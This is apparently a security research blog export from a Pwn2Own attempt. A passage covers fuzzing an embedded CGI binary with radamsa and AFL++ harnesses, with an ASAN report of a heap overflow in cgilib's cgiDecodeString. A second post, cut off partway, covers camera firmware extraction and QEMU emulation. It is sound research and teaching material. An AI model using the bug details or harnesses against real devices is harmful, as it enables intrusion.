radamsa. Radamsa has been choose for its ability to mutate binary input and is perfect for our network protocol fuzzing needs.\n- **Input sending**: once the input has been generated, few lines of python sends the input to the target.\n- **Crash identification**: once the input is sent, a possible crash needs to be verified, of course. Since we had SSH access, we decided to achieve the crash identification using `strace`. Before starting the fuzzer, we execute `strace` (with child tracing) from an SSH session and redirect the output to a temporary file in `/tmp/`. After the input is sent, the python script verifies (using `paramiko` and some wrappers) the content of the `strace` to verify potential crashes.\n\nWe really wanted to explore that option also if we knew that the input parsing was pretty minimal and, for that reason, we were not able to crash the service after few sessions.\n\n## The CGI web service\nWhile our tool was fuzzing the UDP service, we were also understanding the web surface. The web service, exposed on 80 and 443, is a `lighthttpd` web server that redirect all API requests to a CGI binary, while the web root only contains front-end code. CGI is an \"exotic\" and for most, an old school standard. However, it is highly adopted in embedded devices and its main job is to gateway HTTP requests *mostly* to binary applications.\n\n### The CGI interface\nThe Common Gateway Interface (CGI) standard documented in [RFC 3875](https://datatracker.ietf.org/doc/html/rfc3875) is described as \"a simple interface for running external programs, software or gateways under an information server in a platform-independent manner\". Its main function, as the name suggest, is to provide the ability to execute external programs (e.g. binaries) directly from an HTTP request, translating HTTP parameters (URI, headers and body) to environmental and standard input/output interfaces. HTTP data and meta-data are \"proxied\" from the web server (`lighthttpd` in this case) directly to the program transforming the HTTP request into environmental variables in order to be retrieved from the other side with functions like `getenv`. In the case of the body instead, `stdin` is used and `stdout` for the HTTP response. The CGI RFC standard precisely describes how to handle and parse the input request properly (e.g. how to deal with the Content-Length and so on). \n\nAfter carefully reading the RFC and getting familiar with this standard, we started to develop some ideas on how the fuzz the CGI binary itself without passing through the web server, since it can returns generic \"500 Internal Server Error\" for invalid input without being an actual interesting crash. For example, the HTTP POST request for the login operation can be translated with the following cli command:\n\n```bash\necho '{\"username\":\"ubnt\",\"password\":\"ubnt\"}' | REQUEST_METHOD=POST REMOTE_ADDR=127.0.0.1 QUERY_STRING=\"id=1.1/login\" CONTENT_TYPE=\"application/json\" CONTENT_LENGTH=37 /usr/www/rest.cgi\n```\n\nWe can now approach in two different ways: black-box and gray-box fuzzing. Let's start with the simplest one, the black-box approach.\n\n### CGI black-box fuzzing\nIn an infinite life, things could be done perfectly without worrying about time limits or efficiency. However, the first sentence is false, and efficiency is an essential characteristic of good or bad decisions. Upon this \"philosophical\" concept, the talk [Fuzzing from First Principles](https://zerodayengineering.com/research/discussion-fuzzing-from-first-principles.html) ([video](https://www.youtube.com/live/9U-FK_Qi1XQ?si=KsalpgiuZS-6aCB_)) from Alisa, it well intersperse it in the fuzzing area. For that reason, a straight black-box fuzzing setup can still be effective and *sometimes* also more efficient than a more complex setup (e.g. gray-box or white-box) that uses instrumentation, coverage feedback and so on. Similarly to the previous described network UDP fuzzer based on radamsa, we used it again but this time using bash scripting instead of python, due to the easier, and command line oriented, nature of the target.\n\n```bash\n#!/bin/sh\n\necho \"CGI black-box fuzzer ..\"\necho '/id=1.1/version?test=param1\u0026test2=param3\u0026test3=0' \u003e testcase\nwhile true; do\n  /tmp/radamsa testcase -o testcase.new\n  REQUEST_METHOD=GET REMOTE_ADDR=127.0.0.1 QUERY_STRING=$(cat testcase.new) /usr/www/rest.cgi\n  if [ $? -eq 139 ]; then\n    file_size=$(wc -c \u003c testcase.new)\n    # Avoid testcases with size 0\n    if [ $file_size -ne 0 ]; then\n      echo $?\n      echo \"Crash!!\"\n      cp testcase.new testcase.new.$(date +%s)\n    fi\n  fi\ndone\n```\n\nThe script is pretty tiny and simple. First, an initial testcase is generated based on the targeted surface (the URI string, in this case). An infinite loop first mutates the original testcase using a statically ARM64 manually compiled version of [radamsa](https://gitlab.com/akihe/radamsa) and then use it against a specific environmental variable (e.g. `QUERY_STRING`) as input. The return code is then verified for a potential crash. If a segmentation fault is triggered, the testcase is stored locally if it's not empty (since it would be not externally reproducible and exploitable). We executed the script directly on the target and had multiple crashes:\n\n![[notes/images/pwn2own-23/6.png]]\n\nWe had also emulated (extracting key binaries from the target) parts of the target itself in qemu (as described in the [previous part](https://1day.dev/notes/Not-All-Roads-Lead-to-PWN2OWN-Hardware-Hacking-Part-1/) for the Lorex Camera) and fuzzed from there with similar results. However, with some bug triaging, crash points were similar to the gray-box results that were also easier to debug. For that reason, also if we had a lot of crashes from that black-box fuzzing session, we decided to focus more on the other results instead.\n\n### CGI gray-box fuzzing\nBy reverse engineering the CGI binary responsible to handle API requests, we found an interesting call from an external library: `cgiInit`. As we have just briefly mentioned, CGI parsing is not that easy and can be complex in some of its parts since a lot of things needs to be properly handled and taken in consideration. Fuzzing and *complex* parsing are two (/three) words that loves each other, or hate, depending on the point of view. From our point of view, it could be a really interesting attack surface, without the need to go into specific application logic. However, we did not directly landed here. We did an intense reverse engineering activity to understand the binary logic, rename functions, deepen the authentication process and workflow, API handlers and so on. However, since we had only few days left, we made a bet on the CGI *implicit* parsing library. \n\n#### CGI parsing library\nThe mentioned `cgiInit` function is defined in an external system library called `libcgi.so.1`. We had some initial thoughts that it was a custom made CGI parser (*interesting*), but most of developers actually don't want do reinvent the wheel from scratch (*understandable*) and we started to search for common public C/C++ CGI parsers (without any luck) and more *unique* function names that were exported, hoping to find some matches with OSINT. Actually, the second approach turned out with good results using the Github \"Code\" search. We searched for less generic exported function names like `CgiGetFiles` or `CgiFreeList` and we stumbled in a lot of open-source projects that were actually embedding a library named `cgilib` (e.g. this [project](https://github.com/airhorns/codejam2/tree/7618ee5c9cb34bec57ec77eea6817b31d010eafc/C_server/cgilib-0.7)). More google searches led us to the following, deprecated, [Lightweight CGI Library](https://www.infodrom.org/projects/cgilib/index.php) project. To confirm that it was it, and to identify the exact version (actually the *latest* one, 0.7), we did reverse engineering to identify new features across different versions, vendor changes in the code or new functions. Apart of some new introduced functions, the rest of the code was actually the same (without further validations).\n\nAt first, it was really encouraging from our point of view: we had a really old library that parses an interesting CGI standard and we also had the source code of it. The first idea, after a quick code review, was to use AFL against it and wait for the fruits! The code, without offending anyone, is really a mess. Two letters and non descriptive variable names made the review of the code really painful, but that was keeping us aware of the fact that this could also lead to interesting, and not intended, [*weird*](https://youtu.be/Dd9UtHalRDs?si=AVt2RWXJq5KngJvn\u0026t=1431) behavior.\n\n#### AFL setup and library customizations\nCompiling and setting up [AFL++](https://github.com/AFLplusplus/AFLplusplus) is quite easy and out of scope of this article (you can even [use docker](https://github.com/AFLplusplus/AFLplusplus?tab=readme-ov-file#building-and-installing-afl), if you desire). The target we are facing is a library, and for that reason we have to do some modifications and adjustments to make it compatible with a fuzzer like AFL++ that uses the standard input (`stdin`) as a vector. The previously mentioned `cgiInit` function (defined in `cgi.c`), upon other things, calls two interesting functions: `cgiReadVariables` and `cgiReadCookies`.\n\n```C\ns_cgi *cgiInit()\n{\n    s_cgi *res;\n    res = cgiReadVariables ();\n    if (res)\n\t\tres-\u003ecookies = cgiReadCookies ();\n\t// ..\n}\n```\n\nThe first one is responsible to handle the HTTP request and parse fields based on its content type, while the second one, as name suggests, is responsible to parse HTTP cookies. As explained before, all these variables are directly taken from environmental variables with the `getenv` syscall and, in case of the HTTP body, `stdin`. Note that in the \"real\" scenario, these values come directly from `lighttpd` web server that translates HTTP requests to CGI compatible commands.\n\n```C\ns_cookie **cgiReadCookies()\n{\n    char *http_cookie;\n    char *curpos, *n0, *n1, *v0, *v1, *cp;\n    s_cookie **res, *pivot = NULL;\n    int count;\n    int len;\n\n    if ((curpos = http_cookie = getenv (\"HTTP_COOKIE\")) == NULL)\n\t\treturn NULL;\n    count = 0;\n    if ((res = (s_cookie **)malloc (sizeof (s_cookie *))) == NULL)\n\t\treturn NULL;\n    res[0] = NULL;\n    // ..\n}\n```\n\nThe initial corpus has been generated with a set of possible cookie formats.\n\n##### Cookie Parsing customizations\nTo fuzz the cookie parser logic, the input from the environmental variable `HTTP_COOKIE` needs instead to be passed as `stdin`. To achieve that, we can modify the `getenv` part of the code and instead read from standard input: `read(0, afl_input_buffer, AFL_BUF_SZ - 1);`. In this line of code, `afl_input_buffer` is a global `char*` variable that is allocated just before entering the `cgiReadCookies` function with a size of double a page size (`4096 * 2`) defined in the `AFL_BUF_SZ` constant.\n\nNow that we have a way to make the target compatible with AFL++, we just need to compile it and let it run. First of all, the `Makefile` was not working and led to a lot of dependency issues. After some struggles on that, we directly put everything inside a single file, with the only exception of headers, and directly compile it with GCC. We made \"vanilla\" and sessions with [ASAN](https://github.com/google/sanitizers/wiki/AddressSanitizer) enabled in the following way: `gcc -g -fsanitize=address libcgi-afl.c -o libcgi-afl-asan`. The `-g` options for symbolization and `-fsanitize=address` to enable the address sanitizer.\n\nThis is the result of the main function that permits to fuzz HTTP cookies through standard input:\n```C\n#define AFL_BUF_SZ 4096 * 2\nchar* afl_input_buffer;\n\ns_cookie **cgiReadCookies()\n{\n  char *http_cookie;\n  char *curpos, *n0, *n1, *v0, *v1, *cp;\n  s_cookie **res, *pivot = NULL;\n  int count;\n  int len;\n\n  // read STDIN for AFL\n  read(0, afl_input_buffer, AFL_BUF_SZ - 1);\n  curpos = http_cookie = afl_input_buffer;\n\n  //if ((curpos = http_cookie = getenv (\"HTTP_COOKIE\")) == NULL)\n  //  return NULL;\n  \n  count = 0;\n  if ((res = (s_cookie **)malloc (sizeof (s_cookie *))) == NULL)\n    return NULL;\n  res[0] = NULL;\n  // ..\n}\n\nvoid fuzz_cookie(){\n  afl_input_buffer = malloc(AFL_BUF_SZ);\n  cgiReadCookies();\n}\n\nint main (int argc, char **argv, char **env)\n{\n  //fuzz_cookie();\n   return 0;\n}\n```\n\n##### Request parsing customizations\n`cgiReadVariables` is instead responsible to parse whole HTTP requests: `REQUEST_METHOD`, `QUERY_STRING`, `CONTENT_LENGTH` and `CONTENT_TYPE`. The `CONTENT_TYPE` option parsing immediately took our attention due to the more complex logic that needs to be considered during the parsing of `multipart/form-data` requests, implemented in the `cgiReadMultipart` function:\n\n```C\n#define MULTIPART_DELTA 5\n\nchar *cgiGetLine (FILE *stream)\n{\n    static char *line = NULL;\n    static size_t size = 0;\n    char buf[BUFSIZE];\n    char *cp;\n    \n    // ..\n    while (!feof (stream)) {\n      if ((cp = fgets (buf, sizeof (buf), stream)) == NULL))\n\t\t// ..\n    }\n}\ns_cgi *cgiReadMultipart (char *boundary)\n{\n    char *line;\n    char *cp, *xp;\n    // ..\n    while ((line = cgiGetLine (stdin)) != NULL) {\n\t    // ..\n    }\n}\n```\n\nThe good point here is that, as we can see from the function `cgiReadMultipart` extract above, input is directly taken from standard input and less customizations need to be done for AFL++. However, to be coherent with the program logic and the HTTP standard, and to precisely focus the fuzzing effort in the multi part processing logic, we have to set the `CONTENT_TYPE` environmental variable to something like that: `multipart/form-data; boundary=dcaf18a0-0d20-4dc9-9f87-7a863dd4df02`. The boundary identifier here is really important to match the one in the input testcases in order to avoid early rejections of the input during the fuzzing session.\n\n\n```C\ns_cgi *cgiReadVariables (){\n\t// original code\n}\n\nvoid fuzz_multipart_formdata(){\n  cgiDebug(0, 0);\n  setenv(\"CONTENT_TYPE\", \"multipart/form-data; boundary=dcaf18a0-0d20-4dc9-9f87-7a863dd4df02\", 1);\n  cgiReadVariables();\n}\n\nint main (int argc, char **argv, char **env)\n{\n  fuzz_multipart_formdata();\n  return 0;\n}\n```\n\nThe initial input corpus has been taken from some big Burp projects that we had locally. We extracted multi part HTTP requests and fed them directly into `afl-cmin` to minimize it before the first session.\n\n### Results and crash triaging\nWe run both described solutions through different sessions (with and without ASAN), and ...\n\n![[notes/images/pwn2own-23/7.png]]\n\nWe got crashes!\n\nWe now have multiple crashes, little time and few brain cells left (keep in mind the introduction from the [first article](https://1day.dev/notes/Not-All-Roads-Lead-to-PWN2OWN-Hardware-Hacking-Part-1/)) but still, a lot of excitement. To first minimize crashing testcases, [`afl-tmin`](https://manpages.ubuntu.com/manpages/xenial/man1/afl-tmin.1.html) can be used inside a bash loop and is really useful to have a smaller reproducible input that still generates the original crash:\n\n```bash\nfor f in $(ls ./sess1/default/crashes/); do afl-tmin -i ./sess1/default/crashes/$f -o ./minimized-crashes/$f /\u003credacted\u003e/libcgi-afl; done\n```\n\nAfter `afl-tmin`, ASAN can be really useful to identify the root cause of specific crashes. It can be, similarly to the previous snippet, integrated inside a for loop to generate the crashing report:\n\n```bash\n# Compile the binary with ASAN\ngcc -g -fsanitize=address libcgi-afl.c -fsanitize-recover=address -o libcgi-afl-asan\n\nfor f in $(ls ./minimized-crashes); do ASAN_OPTIONS=halt_on_error=0 /\u003credacted\u003e/libcgi-afl-asan \u003c ./minimized-crashes/$f 2\u003e asan/$f; done\n```\n\nYou can also note particular a command line option (`-fsanitize-recover=address`) that tells ASAN to not exit after the first crash report. This is useful since it naturally follows that program logic without interrupting anything, and for our case it was particularly useful because there was a *not interesting* OOB read of one byte at the first stages of input parsing. Chained with the `ASAN_OPTIONS=halt_on_error=0` environmental variable before executing the binary, it doesn't interrupt anything and reports all memory violations that it encounters.\n\n### \"Hey look, ~~water~~ bugs!\"\nAmong all crashes, one in particular caught our attention, and this is its report:\n\n```plain\nERROR: AddressSanitizer: heap-buffer-overflow on address 0xffff88b00ef8 at pc 0xffff8e2ea464 bp 0xffffc237bb40 sp 0xffffc237bb88\nWRITE of size 2 at 0xffff88b00ef8 thread T0\n    #0 0xffff8e2ea460 in __interceptor_memset ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:799\n    #1 0xaaaad60a62a8 in cgiDecodeString /\u003credacted\u003e/cgilib-0.7/libcgi-afl.c:414\n    #2 0xaaaad60a7888 in cgiReadMultipart /\u003credacted\u003e/cgilib-0.7/libcgi-afl.c:719\n    #3 0xaaaad60a7dcc in cgiReadVariables /\u003credacted\u003e/cgilib-0.7/libcgi-afl.c:770\n    #4 0xaaaad60aae90 in fuzz_multipart_formdata /\u003credacted\u003e/cgilib-0.7/libcgi-afl.c:1152\n    #5 0xaaaad60aaef0 in main /\u003credacted\u003e/cgilib-0.7/libcgi-afl.c:1163\n    #6 0xffff8e1273f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58\n    #7 0xffff8e1274c8 in __libc_start_main_impl ../csu/libc-start.c:392\n    #8 0xaaaad60a2cac in _start (/\u003credacted\u003e/cgilib-0.7/libcgi-afl+0x2cac)\n\n0xffff88b00ef8 is located 0 bytes to the right of 40-byte region [0xffff88b00ed0,0xffff88b00ef8)\nallocated by thread T0 here:\n    #0 0xffff8e308e30 in __interceptor_strdup ../../../../src/libsanitizer/asan/asan_interceptors.cpp:454\n    #1 0xaaaad60a787c in cgiReadMultipart /\u003credacted\u003e/cgilib-0.7/libcgi-afl.c:718\n    #2 0xaaaad60a7dcc in cgiReadVariables /\u003credacted\u003e/cgilib-0.7/libcgi-afl.c:770\n    #3 0xaaaad60aae90 in fuzz_multipart_formdata /\u003credacted\u003e/cgilib-0.7/libcgi-afl.c:1152\n    #4 0xaaaad60aaef0 in main /\u003credacted\u003e/cgilib-0.7/libcgi-afl.c:1163\n    #5 0xffff8e1273f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58\n    #6 0xffff8e1274c8 in __libc_start_main_impl ../csu/libc-start.c:392\n    #7 0xaaaad60a2cac in _start (/\u003credacted\u003e/cgilib-0.7/libcgi-afl+0x2cac)\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:799 in __interceptor_memset\nShadow bytes around the buggy address:\n  0x200ff1160180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x200ff1160190: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x200ff11601a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x200ff11601b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x200ff11601c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n=\u003e0x200ff11601d0: fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00[fa]\n  0x200ff11601e0: fa fa 00 00 00 00 02 fa fa fa 00 00 00 00 00 fa\n  0x200ff11601f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x200ff1160200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x200ff1160210: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x200ff1160220: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n=================================================================\n```\n\nASAN immediately tell us that we are dealing with an \"heap-buffer-overflow\" with \"WRITE of size 2\". From the stack trace, we can also identify the exact location where it happens. The `__interceptor_memset` (the ASAN hooked version of `memset`) is the latest reference called function from `cgiDecodeString`. Let's see this function:\n\n```C\nchar *cgiDecodeString (char *text)\n{\n    char *cp, *xp;\n\n    for (cp=text,xp=text; *cp; cp++) {\n\tif (*cp == '%') {\n\t    if (strchr(\"0123456789ABCDEFabcdef\", *(cp+1))\n\t\t\u0026\u0026 strchr(\"0123456789ABCDEFabcdef\", *(cp+2))) {\n\t\tif (islower(*(cp+1)))\n\t\t    *(cp+1) = toupper(*(cp+1));\n\t\tif (islower(*(cp+2)))\n\t\t    *(cp+2) = toupper(*(cp+2));\n\t\t*(xp) = (*(cp+1) \u003e= 'A' ? *(cp+1) - 'A' + 10 : *(cp+1) - '0' ) * 16\n\t\t    + (*(cp+2) \u003e= 'A' ? *(cp+2) - 'A' + 10 : *(cp+2) - '0');\n\t\txp++;cp+=2;\n\t    }\n\t} else {\n\t    *(xp++) = *cp;\n\t}\n    }\n    memset(xp, 0, cp-xp);\n    return text;\n}\n```\n\nWe can immediately correlate the crashing location in the function code, and we can quickly identify that we are dealing with an heap overflow of some sort of calculated size (`cp-xp`) starting from `xp`. However, we can only write `0x0`. Not the best primitive ever, but quite interesting, especially for the `cgiDecodeString` usage across the program. The function is responsible to decode URI encoded strings (e.g. `%41`) to their decoded form (e.g. `A`). Due to this useful utility, it is called from multiple locations, multiple times, and inside for loops that are, in some way, affected from user input. This made, for us, this bug potentially exploitable and interesting to deep in. \n\nHowever, we were the result of the temporary burnout mentioned in the [first part](https://1day.dev/notes/Not-All-Roads-Lead-to-PWN2OWN-Hardware-Hacking-Part-1/). Working too much, without breaks and with too much excitement led us to the mirage of the ~~water~~ bug in the ~~desert~~ target. Actually, the bug was there, but not what we thought. It was the last available night before the pwn2own deadline. I bought two redbulls and spent the *almost* whole night thinking and theorizing about possible side effects that could enhance the primitive into something more powerful (I had some double free ideas on mind) based on some custom heap shaping with the program logic and public known techniques targeting glibc 2.31. This was the resulted mind map of the night:\n\n![[notes/images/pwn2own-23/8.png]]\n\nWhat's funny about that? That I was actually thinking to have a controlled NULL byte overflow, while I only had 2 NULL bytes overflow in the best case. This extreme scenario highlighted the key importance and the necessity of mental and physical breaks, that can be more productive and effective than just working no stop.\n\nHowever, the subtle bug(s) inside the `cgiDecodeString` function are left as an exercise to the reader.\n\n## Conclusion\nAs with all journeys, this one also came to an end. Not the expected and hoped-for result (an RCE), but for sure we learned an incredible amount of technical, but most importantly mindset, skills. The importance of resting is sometimes underestimated and seen as lack of proper motivation or intention, but it's clearly not (in positive terms, of course). This pure hacking experience, combined with intense team collaboration, is one of those things that you don't easily forget in life. \n\n## References\n- https://datatracker.ietf.org/doc/html/rfc3875\n- https://zerodayengineering.com/research/discussion-fuzzing-from-first-principles.html\n- https://youtu.be/Dd9UtHalRDs?si=p8ygDU9eR8ZIVaLS","lastmodified":"2025-04-14T14:14:33.955126385Z","tags":null},"/notes/Not-All-Roads-Lead-to-PWN2OWN-Firmware-Reverse-Engineering-Part-2":{"title":"Not All Roads Lead to PWN2OWN - Firmware Reverse Engineering (Part 2)","content":"\n## Introduction\nIn the [previous blog post](https://1day.dev/notes/Not-All-Roads-Lead-to-PWN2OWN-Hardware-Hacking-Part-1), we have dissected the Lorex 2K IP Camera from an hardware perspective. The main objectives were to obtain an an interactive shell and extract the firmware for further analysis. Although the first point was not achieved due to the target hardening, we were able to extract the firmware. Since we also had the capability to re-flash the firmware with a modified version of it, we could re-create a new version (a custom firmware) with extra debug capabilities to finally embrace the Vulnerability Discovery phase with a solid target. However, as we have introduced in the first post of this series, this was also our sentence to the overall objective (0day) failure. We were able to re-create a custom firmware with custom binaries and with an interactive shell, but with a limit of 40 seconds. The limit was, presumably, some sort of integrity validation at later stages of the booting process. Since we were able to execute arbitrary commands to the target system through a customized firmware, we were thinking that we were just a little bit far from a stable shell. This \"little far\" turns out into the reversing (and emulation) of the whole filesystem image, multiple ARM32 binaries and kernel modules that were also patched to bypass what we thought was the root cause of the reboot trigger. This whole process took us too much time and effort (~75%) compared to what we have allocated for the whole project (two weeks). However, it was a really instructive, fun and interesting experience and that's why today we are sharing further details. If you are interested in using binwalk, qemu, bash/python scripting, dd, Binary Ninja, Ghidra, cross compiling and these topics, hope you will enjoy this post.\n\n## Firmware analysis\nFrom the [last blog post](https://1day.dev/notes/Not-All-Roads-Lead-to-PWN2OWN-Hardware-Hacking-Part-1), we have extracted the firmware blob that we have directly passed to [binwalk](https://github.com/ReFirmLabs/binwalk) to search for the first signals of self contained images. binwalk is a really interesting and helpful tool that can be used to identify images mainly through magic bytes inside a blob of data. Usually, a [firmware](https://en.wikipedia.org/wiki/Firmware) is a just series of bytes that comprehends at least the boot loader, the kernel, the root filesystem and a series of filesystem images that can be mounted and used to store multiple types of data based on the needs.\n\n![[notes/images/pwn2own-23/1.png]]\n\nWith this output, we have clearer overview of self contained images in the firmware. binwalk offers the `-E` option that permits to automatically extract all images that it is able to identify in the data. Usually, this is enough to have a valid working image but you have to trust its extraction process (more on that later). By extracting the whole content, an interesting file called `partitionV2.txt`, part of the firmware image, contains the partitioning map of the image:\n```plain\n# Version=3\n#       name                cs         offset              size         mask_flags     fs_flags      fs_type         mount_cmd                                                        backup_off\n  U-Boot,             0, 0x0000000000000000,    0x0000000000030000,             RW,                ,             ,                           ,                                        0xffffffffffffffff,\n  hwid,               0, 0x0000000000030000,    0x0000000000010000,             RW,            ,                 ,               ,                                                    0xffffffffffffffff,\n  partition,          0, 0x0000000000040000,    0x0000000000010000,             RW,                        R,            cramfs,         ,                                            0xffffffffffffffff,\n  Kernel,             0, 0x0000000000050000,    0x0000000000150000,             RW,            ,                 ,               ,                                                    0xffffffffffffffff,\n  romfs,              0, 0x00000000001A0000,    0x0000000000610000,             RW,            R,            squashfs,       ,                                                        0xffffffffffffffff,\n  config,             0, 0x00000000007B0000,    0x0000000000050000,                 RW,            RW,           jffs2,          \"mnt_jffs2 /dev/mtdblock5 /mnt/mtd jffs2\",           0xffffffffffffffff,\n```\n\nWith that information, combined with guessed (and retrieved) information from `binwalk`, we can clearly identify key parts of the image: the bootloader that starts at `0x0`, the kernel at `0x50000` and the root file-system (`romfs`) at `0x1A0000`. Apart of these key parts of the firmware also other partitions were identified with their offset, size and file-system type (cramfs, jfss2 and squashfs): hwid, partition, config.\n\n### Root filesystem analysis\nOne of the most interesting things from a firmware image of an embedded device, from a vulnerability hunting point of view, is the root file system. Here we find main binaries and services that are exposed in the target device (web services, custom protocols, *backdoors*, ..). Starting from the init scripts (scripts and binaries that are executed just after the kernel initialization phase) is a good starting point to have an initial clue of the product inner workings. The `/etc/initab` file tells us that `/etc/init.d/dnode` and `/etc/init.d/rcS` are executed at the system startup. The `dnode` script is responsible to mount previously mentioned filesystems through `mount -a` (with partitions configured in the `fstab` file), configure some character devices and adjust some directory permissions. However, the most interesting init script is `rcS`. Its responsibility is to configure the whole system, load kernel modules (from other scripts) and start all product services.\n\n```bash\n#!/bin/bash\n\n# ...\nKEYBOARD=0\nCMDLINE=\"/proc/BootInfo/bootpara\"\nKEYBOARD=`cat $CMDLINE`\nKEYBOARD=${KEYBOARD##*dh_keyboard:}\nKEYBOARD=${KEYBOARD%%ethaddr*}\nif [ $KEYBOARD == '1' ];then\n    echo \"keyboard = 1\"\n    ln -s /dev/null /dev/mytty\n\nelse\n    echo \"keyboard = 0\"\n    ln -s /dev/ttyS0 /dev/mytty\nfi\n\n# ç”Ÿäº§ç¨‹åºå¯åŠ¨telnetd\nif [ -f /usr/data/imgFlag ]; then\n    /sbin/telnetd \u0026\nfi\n# ...\n```\n\nThe *partial* `rcS` content below shows some interesting key points. The `/proc/BootInfo/bootpara` and `/usr/data/imgFlag` files are used to enable some debug capabilities. The first retrieves the `KEYBOARD` value and this can be potentially set from the bootloader argument, but we were not able to dynamically modify bootloader parameters at boot time (neither in the firmware image directly as we will see later). If set, as the default production configuration, the tty is symlinked to `/dev/null` and for that reason, we couldn't see a lot of logs from the UART interface.\nThe second file `/usr/data/imgFlag` seems really interesting because it's a clear and straightforward way to enable some debug capabilities executing `telnetd` in background. However, `/sbin/telnetd` in the file-system image is a symlink to busybox and, the installed version of busybox in the firmware did not supported telnet. Hence, also by executing `telnetd` (or enabling that debug capability creating the file) we would not be able to spawn the telnet service.\n\n```bash\n# ...\n/usr/etc/imod\n# ...\nAPPAUTO=0\nCMDLINE=\"/proc/BootInfo/bootpara\"\nAPPAUTO=`cat $CMDLINE`\nAPPAUTO=${APPAUTO##*appauto:}\nAPPAUTO=${APPAUTO%%dh_keyboard*}\n\nif [ $APPAUTO == '1' ];then\n\techo \"appauto=1\"\n    #dh_keyboardä½æ˜¯1æ—¶å°†soniaçš„è¾“å‡ºå±è”½æŽ‰\n    if [ $KEYBOARD = '1' ]; then\n        /usr/bin/sonia $sonia_para 2\u003e/dev/null 1\u003e/dev/null\n    else\n        /usr/bin/sonia $sonia_para\n    fi\nelse\n\techo \"appauto=0\"\n\n    if [ $KEYBOARD == '1' ];then\n\techo \"keyboard = 1\"\n\twhile [ 1 ]\n\tdo\n\t\tbusybox sleep 60\n\tdone\n    else\n        echo \"keyboard = 0\"\n        sh\n    fi\nfi\n```\n\nThe `rcS` script also executes `/usr/etc/imod` that is mainly responsible to load kernel modules, but we will treat that argument later. The last code from the `rcS` init script responsible to start the main binary `/usr/bin/sonia` in two different ways based on specific parameters (`APPAUTO` and `KEYBOARD`) as can be seen. Almost all services in the Lorex 2K IP Camera are handled directly from that fat binary. For that reason, we nickamed it \"sonia-centric\".\n\nAfter that quick overview of the IP Camera boot process, we wanted to achieve two things: emulate it and customize the firmware for a stable working environment. Let's start with the emulation process that was useful for the second part.\n\n### Just emulate it \nThe title of this chapter is inspired from the article [How to â€œJust Emulate It With QEMUâ€](https://www.zerodayinitiative.com/blog/2020/5/27/mindshare-how-to-just-emulate-it-with-qemu) that demonstrates how \"just emulate it with qemu\" is not always an easy task. \nWhen starting to dive into something is always important to keep the objective in mind, and in our case the emulation goal was to have a working emulated environment for debugging and (why not) fuzzing and exploitation purposes. This part is not intended to be a 101 on how to use qemu because there are plenty of public resources but will discuss the approach. In order to emulate a system in qemu we need two basic things: a **kernel** and a **root file system**. We already have the root file system (from the firmware) and potentially also the kernel (remember the firmware structure?). However, the kernel is usually compiled specifically for a board and honestly, since we were not planning to attack the kernel directly, a manual compiled kernel was more than enough and easier to build and debug.\n\n#### Just compile the kernel\nFrom the firmware image we retrieve the exact kernel version and from the identified SOC the exact architecture: Linux 4.9.84 on ARM32 EABI . With that information, we can configure necessary toolchains (from apt as shown below or directly from [linaro repositories](https://releases.linaro.org/components/toolchain/binaries/4.9-2017.01/arm-eabi/gcc-linaro-4.9.4-2017.01-x86_64_arm-eabi.tar.xz)), download the exact kernel version from kernel.org, apply a [little patch](https://github.com/BPI-SINOVOIP/BPI-M4-bsp/issues/4) for a known compilation issue, configure the kernel with `vexpress_defconfig` config specifying the cross compilation option with `arm-linux-gnueabi-`, remove `SMP` and `PREEMPT` (to match as much as possible the real target) and finally compile it:\n```bash\nsudo apt-get install build-essential libncurses-dev bison flex libssl-dev libelf-dev\nsudo apt install gcc-arm-linux-gnueabi\n\nwget https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.9.84.tar.xz\ntar -xvf linux-4.9.84.tar.xz\ncd linux-4.9.84/\n\n## apply the patch (https://github.com/BPI-SINOVOIP/BPI-M4-bsp/issues/4)\nvim scripts/dtc/dtc-lexer.l\n\nmake ARCH=arm CROSS_COMPILE=arm-linux-gnueabi- vexpress_defconfig\necho \"CONFIG_SMP=n\" \u003e\u003e .config\necho \"CONFIG_PREEMPT=y\" \u003e\u003e .config\nmake ARCH=arm CROSS_COMPILE=arm-linux-gnueabi- olddefconfig\nmake ARCH=arm CROSS_COMPILE=arm-linux-gnueabi- -j $(nproc)\n```\n\n#### Just use the firmware image\nWe have a compiled kernel, now we *just need* to use the extracted firmware image as the root file system. However, we wanted to apply some changes in order to have more control over our environment and for that, we had to *unsquash* and *resquash* the image. As we have seen before, we can easily extract images from a data blob using binwalk. However, you have to trust its (reliable but automated) extraction process. We can use `dd` to precisely extract the root file system (of type squashfs) from the firmware directly using parameters identified in the `partitionV2.txt` file previously shown. With the extracted image we can now *unsquash* it (`unsquashfs`), modify the content and *re-squash* it (`mksquashfs`)\n\n```bash\nsquashfs_size=6356992 # partitionV2.txt\nsquashfs_offset=1703936\ndd if=\"$fw_original\" of=\"$squashfs_original\" bs=1 skip=$squashfs_offset count=$squashfs_size\n```\n\nWith that, we can reliable extract the image and make appropriate changes for our emulated environment needs since the original firmware is restricted in many ways. For example, we can cross-compile a more complete busybox binary version in order to have more available commands, gdb and so on. \nInstead of *squashing* the image every time, it is also possible to quickly create an initramfs from it:\n```bash\nBACK=$(pwd)\nTOP=$(realpath ./image/)\ncd $TOP/squashfs-root/\nfind . | cpio -H newc -o \u003e ../initramfs.cpio\ncd ..\ncat initramfs.cpio | gzip \u003e $TOP/initramfs.gz\ncd $BACK\n```\n\n#### Just put everything together\nNow we have a working kernel and a customized firmware image and we only want to put pieces together and make it run. To achieve that, can use `qemu-system-arm` with the following 